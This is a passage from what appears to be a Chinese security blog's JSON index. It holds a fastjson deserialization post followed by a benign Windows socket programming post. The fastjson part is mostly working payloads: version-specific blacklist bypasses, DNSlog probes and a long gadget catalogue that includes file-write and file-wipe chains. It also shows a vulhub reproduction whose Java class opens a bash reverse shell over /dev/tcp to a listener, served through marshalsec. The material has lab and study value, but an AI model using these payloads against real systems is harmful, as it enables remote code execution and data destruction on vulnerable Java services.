+ &quot;\\&quot;_outputProperties\\&quot;:&#123;&#125;&#125;\\n&quot;; System.out.println(payload); //反序列化 Object object = JSON.parseObject(payload, Feature.SupportNonPublicField); &#125;&#125; JdbcRowSetImpl payload 12345&#123; &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;:&quot;ldap://127.0.0.1:23457/Command8&quot;, &quot;autoCommit&quot;:true&#125; fastjson1.2.25 payload 12345&#123; &quot;@type&quot;:&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;, &quot;dataSourceName&quot;:&quot;ldap://127.0.0.1:23457/Command8&quot;, &quot;autoCommit&quot;:true&#125; fastjson1.2.42 payload 12345&#123; &quot;@type&quot;:&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;, &quot;dataSourceName&quot;:&quot;ldap://127.0.0.1:23457/Command8&quot;, &quot;autoCommit&quot;:true&#125; fastjson1.2.43 payload 12345&#123; &quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;[, &#123;&quot;dataSourceName&quot;:&quot;ldap://127.0.0.1:23457/Command8&quot;, &quot;autoCommit&quot;:true&#125; fastjson1.2.44 这个版本主要是修复上一个版本中使用 [ 绕过黑名单防护的问题 fastjson1.2.45 黑名单绕过 payload 123456&#123; &quot;@type&quot;:&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;, &quot;properties&quot;:&#123; &quot;data_source&quot;:&quot;ldap://127.0.0.1:23457/Command8&quot; &#125;&#125; fastjson1.2.47 payload 1234567891011&#123; &quot;su18&quot;: &#123; &quot;@type&quot;: &quot;java.lang.Class&quot;, &quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot; &#125;, &quot;su19&quot;: &#123; &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;, &quot;autoCommit&quot;: true &#125;&#125; fastjson版本探测DNSlog探测 以下POC出网，说明fastjson&lt;&#x3D;1.2.47 1&#123;&quot;name&quot;:&#123;&quot;@type&quot;:&quot;java.net.InetAddress&quot;,&quot;val&quot;:&quot;1247.xxxxx.dnslog.cn&quot;&#125;&#125; 以下这个POC出网，说明fastjson&gt;&#x3D;1.2.37 1&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://weffewfddd.dnslog.cn&quot;&#125;:&quot;aaa&quot;&#125; 以下这个POC出网，证明fastjson版本号1.1.16&lt;&#x3D;version&lt;&#x3D;1.2.24 1&#123;&quot;b&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://xxxdsf.dnslog.cn:9999/POC&quot;,&quot;autoCommit&quot;:true&#125;&#125; 以下这几个POC，只能证明fastjson出网，无法判断fastjson是否存在反序列化漏洞，因为最新的打了补丁的fastjson也是能发起DNS请求的。 12345&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;sdffsd.dnslog.cn&quot;&#125;&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;xxxxx.dnslog.cn&quot;&#125;&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;wefewffw.dnslog.cn&quot;&#125;&#125; 报错判断 提交一下两个POC，会抛出异常，有时候会显示出fastjson版本号来。 12345&#123;&quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;[&quot;test&quot;:1] 输入一些乱码字符，让web应用报错，有时候也会带出来版本号 vulhub漏洞复现fastjson1.2.24 docker启动环境 kali创建TouchFile文件用来反弹shell。 123456789101112131415import java.lang.Runtime;import java.lang.Process;public class TouchFile &#123;static &#123; try &#123; Runtime r = Runtime.getRuntime(); Process p = r.exec(new String[]&#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp; /dev/tcp/192.168.5.143/4444 0&gt;&amp;1&quot;&#125;); p.waitFor(); &#125; catch (Exception e) &#123; // do nothing &#125; &#125;&#125; python起一个http服务 1python2 -m SimpleHTTPServer marshalsec启动RMI服务器 1java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.110.141:4433/#TouchFile&quot; 9988 kali上用NC开启端口监听 1nc -lvvp 4444 抓包改为POST包 1234567891011121314151617POST / HTTP/1.1Host: 192.168.110.141:8090User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36Accept: */*Accept-Encoding: gzip, deflateAccept-Language: enConnection: closeContent-Type: application/jsonContent-Length: 165&#123; &quot;b&quot;:&#123; &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;:&quot;rmi://192.168.110.141:9988/TouchFile&quot;, &quot;autoCommit&quot;:true &#125;&#125; 弹到shell fastjson1.2.27payload总结JdbcRowSetImpl 12345&#123; &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;, &quot;autoCommit&quot;: true&#125; TemplatesImpl 1234567&#123; &quot;@type&quot;: &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;, &quot;_bytecodes&quot;: [&quot;yv66vgA...k=&quot;], &#x27;_name&#x27;: &#x27;su18&#x27;, &#x27;_tfactory&#x27;: &#123;&#125;, &quot;_outputProperties&quot;: &#123;&#125;,&#125; JndiDataSourceFactory 123456&#123; &quot;@type&quot;: &quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;, &quot;properties&quot;: &#123; &quot;data_source&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot; &#125;&#125; SimpleJndiBeanFactory 1234567891011&#123; &quot;@type&quot;: &quot;org.springframework.beans.factory.config.PropertyPathFactoryBean&quot;, &quot;targetBeanName&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;, &quot;propertyPath&quot;: &quot;su18&quot;, &quot;beanFactory&quot;: &#123; &quot;@type&quot;: &quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;, &quot;shareableResources&quot;: [ &quot;ldap://127.0.0.1:23457/Command8&quot; ] &#125;&#125; DefaultBeanFactoryPointcutAdvisor 12345678910111213&#123; &quot;@type&quot;: &quot;org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor&quot;, &quot;beanFactory&quot;: &#123; &quot;@type&quot;: &quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;, &quot;shareableResources&quot;: [ &quot;ldap://127.0.0.1:23457/Command8&quot; ] &#125;, &quot;adviceBeanName&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;&#125;,&#123; &quot;@type&quot;: &quot;org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor&quot;&#125; WrapperConnectionPoolDataSource 1234&#123; &quot;@type&quot;: &quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;, &quot;userOverridesAsString&quot;: &quot;HexAsciiSerializedMap:aced000...6f;&quot; &#125; JndiRefForwardingDataSource 12345&#123; &quot;@type&quot;: &quot;com.mchange.v2.c3p0.JndiRefForwardingDataSource&quot;, &quot;jndiName&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;, &quot;loginTimeout&quot;: 0 &#125; InetAddress 1234&#123; &quot;@type&quot;: &quot;java.net.InetAddress&quot;, &quot;val&quot;: &quot;http://dnslog.com&quot;&#125; Inet6Address 1234&#123; &quot;@type&quot;: &quot;java.net.Inet6Address&quot;, &quot;val&quot;: &quot;http://dnslog.com&quot;&#125; URL 1234&#123; &quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;: &quot;http://dnslog.com&quot;&#125; JSONObject 123456789&#123; &quot;@type&quot;: &quot;com.alibaba.fastjson.JSONObject&quot;, &#123; &quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;: &quot;http://dnslog.com&quot; &#125;&#125;&quot;&quot;&#125; URLReader 12345678910&#123; &quot;poc&quot;: &#123; &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;: &quot;com.alibaba.fastjson.JSONReader&quot;, &quot;reader&quot;: &#123; &quot;@type&quot;: &quot;jdk.nashorn.api.scripting.URLReader&quot;, &quot;url&quot;: &quot;http://127.0.0.1:9999&quot; &#125; &#125;&#125; AutoCloseable 任意文件写入 123456789101112&#123; &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;: &quot;org.apache.commons.compress.compressors.gzip.GzipCompressorOutputStream&quot;, &quot;out&quot;: &#123; &quot;@type&quot;: &quot;java.io.FileOutputStream&quot;, &quot;file&quot;: &quot;/path/to/target&quot; &#125;, &quot;parameters&quot;: &#123; &quot;@type&quot;: &quot;org.apache.commons.compress.compressors.gzip.GzipParameters&quot;, &quot;filename&quot;: &quot;filecontent&quot; &#125;&#125; BasicDataSource 12345678&#123; &quot;@type&quot; : &quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;, &quot;driverClassName&quot; : &quot;$$BCEL$$$l$8b$I$A$A$A$A...&quot;, &quot;driverClassLoader&quot; : &#123; &quot;@type&quot;:&quot;Lcom.sun.org.apache.bcel.internal.util.ClassLoader;&quot; &#125;&#125; JndiConverter 1234&#123; &quot;@type&quot;: &quot;org.apache.xbean.propertyeditor.JndiConverter&quot;, &quot;AsText&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;&#125; JtaTransactionConfig 1234567&#123; &quot;@type&quot;: &quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;, &quot;properties&quot;: &#123; &quot;@type&quot;: &quot;java.util.Properties&quot;, &quot;UserTransaction&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot; &#125;&#125; JndiObjectFactory 1234&#123; &quot;@type&quot;: &quot;org.apache.shiro.jndi.JndiObjectFactory&quot;, &quot;resourceName&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;&#125; AnterosDBCPConfig 1234&#123; &quot;@type&quot;: &quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;, &quot;metricRegistry&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;&#125; AnterosDBCPConfig2 1234&#123; &quot;@type&quot;: &quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;, &quot;healthCheckRegistry&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;&#125; CacheJndiTmLookup 1234&#123; &quot;@type&quot;: &quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;, &quot;jndiNames&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;&#125; AutoCloseable 清空指定文件 123456&#123; &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;:&quot;java.io.FileOutputStream&quot;, &quot;file&quot;:&quot;/tmp/nonexist&quot;, &quot;append&quot;:false&#125; AutoCloseable 清空指定文件 123456&#123; &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;:&quot;java.io.FileWriter&quot;, &quot;file&quot;:&quot;/tmp/nonexist&quot;, &quot;append&quot;:false&#125; AutoCloseable 任意文件写入 1234567891011121314151617181920212223242526272829&#123; &quot;stream&quot;: &#123; &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;:&quot;java.io.FileOutputStream&quot;, &quot;file&quot;:&quot;/tmp/nonexist&quot;, &quot;append&quot;:false &#125;, &quot;writer&quot;: &#123; &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;:&quot;org.apache.solr.common.util.FastOutputStream&quot;, &quot;tempBuffer&quot;:&quot;SSBqdXN0IHdhbnQgdG8gcHJvdmUgdGhhdCBJIGNhbiBkbyBpdC4=&quot;, &quot;sink&quot;: &#123; &quot;$ref&quot;:&quot;$.stream&quot; &#125;, &quot;start&quot;:38 &#125;, &quot;close&quot;: &#123; &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;:&quot;org.iq80.snappy.SnappyOutputStream&quot;, &quot;out&quot;: &#123; &quot;$ref&quot;:&quot;$.writer&quot; &#125; &#125;&#125; BasicDataSource 12345678&#123; &quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;, &quot;driverClassName&quot;: &quot;true&quot;, &quot;driverClassLoader&quot;: &#123; &quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot; &#125;, &quot;driverClassName&quot;: &quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A...o$V$A$A&quot; &#125; HikariConfig 1234&#123; &quot;@type&quot;: &quot;com.zaxxer.hikari.HikariConfig&quot;, &quot;metricRegistry&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;&#125; HikariConfig 1234&#123; &quot;@type&quot;: &quot;com.zaxxer.hikari.HikariConfig&quot;, &quot;healthCheckRegistry&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;&#125; HikariConfig 1234&#123; &quot;@type&quot;: &quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;, &quot;metricRegistry&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;&#125; HikariConfig 1234&#123; &quot;@type&quot;: &quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;, &quot;healthCheckRegistry&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;&#125; SessionBeanProvider 12345&#123; &quot;@type&quot;: &quot;org.apache.commons.proxy.provider.remoting.SessionBeanProvider&quot;, &quot;jndiName&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;, &quot;Object&quot;: &quot;su18&quot;&#125; JMSContentInterceptor 123456789&#123; &quot;@type&quot;: &quot;org.apache.cocoon.components.slide.impl.JMSContentInterceptor&quot;, &quot;parameters&quot;: &#123; &quot;@type&quot;: &quot;java.util.Hashtable&quot;, &quot;java.naming.factory.initial&quot;: &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;, &quot;topic-factory&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot; &#125;, &quot;namespace&quot;: &quot;&quot;&#125; ContextClassLoaderSwitcher 123456789&#123; &quot;@type&quot;: &quot;org.jboss.util.loading.ContextClassLoaderSwitcher&quot;, &quot;contextClassLoader&quot;: &#123; &quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot; &#125;, &quot;a&quot;: &#123; &quot;@type&quot;: &quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmS$ebN$d4P$...$A$A&quot; &#125;&#125; OracleManagedConnectionFactory 1234&#123; &quot;@type&quot;: &quot;oracle.jdbc.connector.OracleManagedConnectionFactory&quot;, &quot;xaDataSourceName&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;&#125; JNDIConfiguration 1234&#123; &quot;@type&quot;: &quot;org.apache.commons.configuration.JNDIConfiguration&quot;, &quot;prefix&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;&#125;","categories":[{"name":"java安全","slug":"java安全","permalink":"http://example.com/categories/java%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"java安全","slug":"java安全","permalink":"http://example.com/tags/java%E5%AE%89%E5%85%A8/"}]},{"title":"windows下socket通信","slug":"windows下socket通信","date":"2022-07-31T13:16:50.000Z","updated":"2022-09-08T12:29:32.506Z","comments":true,"path":"2022/07/31/windows下socket通信/","link":"","permalink":"http://example.com/2022/07/31/windows%E4%B8%8Bsocket%E9%80%9A%E4%BF%A1/","excerpt":"","text":"123456789101112131415161718192021222324252627282930313233343536373839404142server.c#include &lt;stdio.h&gt;#include &lt;winsock2.h&gt;#pragma comment (lib, &quot;ws2_32.lib&quot;) //加载 ws2_32.dll int main()&#123; //初始化 DLL WSADATA wsaData; WSAStartup(MAKEWORD(2, 2), &amp;wsaData); //创建套接字 SOCKET servSock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP); //绑定套接字 struct sockaddr_in sockAddr; memset(&amp;sockAddr, 0, sizeof(sockAddr)); //每个字节都用0填充 sockAddr.sin_family = PF_INET; //使用IPv4地址 sockAddr.sin_addr.s_addr = inet_addr(&quot;127.0.0.1&quot;); //具体的IP地址 sockAddr.sin_port = htons(1234); //端口 bind(servSock, (SOCKADDR*)&amp;sockAddr, sizeof(SOCKADDR)); //进入监听状态 listen(servSock, 20); //接收客户端请求 SOCKADDR clntAddr; int nSize = sizeof(SOCKADDR); SOCKET clntSock = accept(servSock, (SOCKADDR*)&amp;clntAddr, &amp;nSize); //向客户端发送数据 char *str = &quot;Hello World!&quot;; send(clntSock, str, strlen(str) + sizeof(char), 0); //关闭套接字 closesocket(clntSock); closesocket(servSock); //终止 DLL 的使用 WSACleanup(); return 0;&#125; 1234567891011121314151617181920212223242526272829303132333435363738client.c#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;WinSock2.h&gt;#pragma comment(lib, &quot;ws2_32.lib&quot;) //加载 ws2_32.dll int main()&#123; //初始化DLL WSADATA wsaData; WSAStartup(MAKEWORD(2, 2), &amp;wsaData); //创建套接字 SOCKET sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP); //向服务器发起请求 struct sockaddr_in sockAddr; memset(&amp;sockAddr, 0, sizeof(sockAddr)); //每个字节都用0填充 sockAddr.sin_family = PF_INET; sockAddr.sin_addr.s_addr = inet_addr(&quot;127.0.0.1&quot;); sockAddr.sin_port = htons(1234); connect(sock, (SOCKADDR*)&amp;sockAddr, sizeof(SOCKADDR)); //接收服务器传回的数据 char szBuffer[MAXBYTE] = &#123; 0 &#125;; recv(sock, szBuffer, MAXBYTE, NULL); //输出接收到的数据 printf(&quot;Message form server: %s\\n&quot;, szBuffer); //关闭套接字 closesocket(sock); //终止使用 DLL WSACleanup(); system(&quot;pause&quot;); return 0;&#125; 分别编译server.c&amp;client.c，先运行server.exe创建server端，后运行client.exe，可得结果如下 wireshark抓包分析 根据SYN,ACK标识可以看到serve和client端三次握手建立TCP连接 根据PSH,ACK标识以及Len&#x3D;13可以看到serve和client端进行数据交互，传输了13个字符 根据FIN,ACK标识可以看到serve和client端四次挥手，断开TCP连接 这里再简单复习一下三次握手，四次挥手 1234567891011121314151617181920三次握手：刚开始客户端处于 closed 的状态，服务端处于 listen 状态。然后1、第一次握手：客户端给服务端发一个 SYN 报文，并指明客户端的初始化序列号 ISN（c）。此时客户端处于 SYN_Send 状态。2、第二次握手：服务器收到客户端的 SYN 报文之后，会以自己的 SYN 报文作为应答，并且也是指定了自己的初始化序列号 ISN(s)，同时会把客户端的 ISN + 1 作为 ACK 的值，表示自己已经收到了客户端的 SYN，此时服务器处于 SYN_REVD 的状态。3、第三次握手：客户端收到 SYN 报文之后，会发送一个 ACK 报文，当然，也是一样把服务器的 ISN + 1 作为 ACK 的值，表示已经收到了服务端的 SYN 报文，此时客户端处于 establised 状态。4、服务器收到 ACK 报文之后，也处于 establised 状态，此时，双方以建立起了链接。四次挥手：1、第一次挥手：客户端发送一个 FIN 报文，报文中会指定一个序列号。此时客户端处于FIN_WAIT1状态。2、第二次握手：服务端收到 FIN 之后，会发送 ACK 报文，且把客户端的序列号值 + 1 作为 ACK 报文的序列号值，表明已经收到客户端的报文了，此时服务端处于 CLOSE_WAIT状态。3、第三次挥手：如果服务端也想断开连接了，和客户端的第一次挥手一样，发给 FIN 报文，且指定一个序列号。此时服务端处于 LAST_ACK 的状态。4、第四次挥手：客户端收到 FIN 之后，一样发送一个 ACK 报文作为应答，且把服务端的序列号值 + 1 作为自己 ACK 报文的序列号值，此时客户端处于 TIME_WAIT 状态。需要过一阵子以确保服务端收到自己的 ACK 报文之后才会进入 CLOSED 状态5、服务端收到 ACK 报文之后，就处于关闭连接了，处于 CLOSED 状态。","categories":[{"name":"windows逆向","slug":"windows逆向","permalink":"http://example.com/categories/windows%E9%80%86%E5%90%91/"},{"name":"编程","slug":"windows逆向/编程","permalink":"http://example.com/categories/windows%E9%80%86%E5%90%91/%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"二进制","slug":"二进制","permalink":"http://example.com/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"},{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"windows编程","slug":"windows编程","permalink":"http://example.com/tags/windows%E7%BC%96%E7%A8%8B/"}]}],"categories":[{"name":"内核","slug":"内核","permalink":"http://example.com/categories/%E5%86%85%E6%A0%B8/"},{"name":"虚拟化","slug":"内核/虚拟化","permalink":"http://example.com/categories/%E5%86%85%E6%A0%B8/%E8%99%9A%E6%8B%9F%E5%8C%96/"},{"name":"虚拟化","slug":"虚拟化","permalink":"http://example.com/categories/%E8%99%9A%E6%8B%9F%E5%8C%96/"},{"name":"windows逆向，内核安全","slug":"windows逆向，内核安全","permalink":"http://example.com/categories/windows%E9%80%86%E5%90%91%EF%BC%8C%E5%86%85%E6%A0%B8%E5%AE%89%E5%85%A8/"},{"name":"红蓝攻防","slug":"红蓝攻防","permalink":"http://example.com/categories/%E7%BA%A2%E8%93%9D%E6%94%BB%E9%98%B2/"},{"name":"web安全","slug":"红蓝攻防/web安全","permalink":"http://example.com/categories/%E7%BA%A2%E8%93%9D%E6%94%BB%E9%98%B2/web%E5%AE%89%E5%85%A8/"},{"name":"黑科技","slug":"黑科技","permalink":"http://example.com/categories/%E9%BB%91%E7%A7%91%E6%8A%80/"},{"name":"java安全","slug":"java安全","permalink":"http://example.com/categories/java%E5%AE%89%E5%85%A8/"},{"name":"docker","slug":"docker","permalink":"http://example.com/categories/docker/"},{"name":"恶意代码","slug":"恶意代码","permalink":"http://example.com/categories/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"windows逆向","slug":"windows逆向","permalink":"http://example.com/categories/windows%E9%80%86%E5%90%91/"},{"name":"编程","slug":"windows逆向/编程","permalink":"http://example.com/categories/windows%E9%80%86%E5%90%91/%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"},{"name":"虚拟化","slug":"虚拟化","permalink":"http://example.com/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"},{"name":"windows,windows安全,反调试","slug":"windows-windows安全-反调试","permalink":"http://example.com/tags/windows-windows%E5%AE%89%E5%85%A8-%E5%8F%8D%E8%B0%83%E8%AF%95/"},{"name":"攻防","slug":"攻防","permalink":"http://example.com/tags/%E6%94%BB%E9%98%B2/"},{"name":"web安全","slug":"web安全","permalink":"http://example.com/tags/web%E5%AE%89%E5%85%A8/"},{"name":"黑科技","slug":"黑科技","permalink":"http://example.com/tags/%E9%BB%91%E7%A7%91%E6%8A%80/"},{"name":"java安全","slug":"java安全","permalink":"http://example.com/tags/java%E5%AE%89%E5%85%A8/"},{"name":"docker","slug":"docker","permalink":"http://example.com/tags/docker/"},{"name":"恶意代码","slug":"恶意代码","permalink":"http://example.com/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"二进制","slug":"二进制","permalink":"http://example.com/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"},{"name":"java框架","slug":"java框架","permalink":"http://example.com/tags/java%E6%A1%86%E6%9E%B6/"},{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"windows编程","slug":"windows编程","permalink":"http://example.com/tags/windows%E7%BC%96%E7%A8%8B/"}]}